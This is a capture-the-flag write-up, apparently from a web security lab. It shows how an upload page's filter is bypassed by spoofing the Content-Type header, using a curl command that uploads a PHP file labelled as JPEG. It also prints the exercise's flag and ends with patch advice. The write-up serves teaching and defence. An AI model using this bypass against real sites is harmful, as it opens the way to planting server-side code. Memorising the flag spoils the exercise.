# Exploit
1. Visit the URL: `/index.php?page=upload`. This page allows uploading "jpeg" files.
2. Attempts to upload a "php" file fail because the browser sends the `Content-Type` header as `application/octet-stream` for PHP files, whereas it uses `image/jpeg` for JPEG files.
3. Modify the `Content-Type` header to bypass this restriction. The Web Application Firewall (WAF) appears to validate only the `Content-Type` header.

### Steps:
Use Burp Suite to intercept and modify the HTTP request, or use the following `curl` command:

```bash
echo '<?php echo "I am bad" ?>' > /tmp/bad.php && curl -X POST -F "Upload=Upload" -F "uploaded=@/tmp/bad.php;type=image/jpeg" "http://x.x.x.x/index.php?page=upload" | grep 'The flag is :'
The response contains the flag: 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8.
Patch
To prevent such exploits:

Never trust user input.
Validate uploads with a combination of measures, including:
Whitelisting filenames and renaming uploaded files.
Detecting and blocking unauthorized file types, regardless of Content-Type.
Verifying file size limits.
Checking and restricting file permissions. """